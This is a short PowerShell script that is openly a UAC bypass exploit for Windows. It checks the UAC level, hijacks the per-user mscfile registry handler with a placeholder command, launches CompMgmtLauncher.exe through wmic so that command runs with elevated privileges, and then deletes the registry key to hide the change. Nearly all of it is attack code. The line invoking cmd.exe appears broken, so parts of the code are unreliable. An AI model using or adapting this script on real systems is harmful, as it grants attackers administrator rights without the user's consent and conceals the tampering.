$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

if ($ConsentPrompt -eq 2 -and $SecureDesktopPrompt -eq 1) {
	Echo "[!] UAC is set to Always Notify.  This exploit will not work."
} else {
	Echo "[*] UAC is set to Default.  This exploit will work."

	$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
	$ValueName = "(Default)"
	$RegValue = "[Command To Execute]"

	New-Item -Path $MscRegPath -Force | Out-Null
	New-ItemProperty -Path $MscRegPath -Name $ValueName -Value $RegValue | Out-Null

	$CompMgmtBypass = 'wmic process call create "cmd.exe /c start /min C:\Windows\System32\CompMgmtLauncher.exe"'
	$a_cmd = "C:\Windows\System32\cmd.exe"
	&$a_cmd = $CompMgmtBypass

	Start-Sleep -s 5

	$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
	Remove-Item -Path $MscRegCleanup -Force -Recurse -ErrorAction SilentContinue | Out-Null
}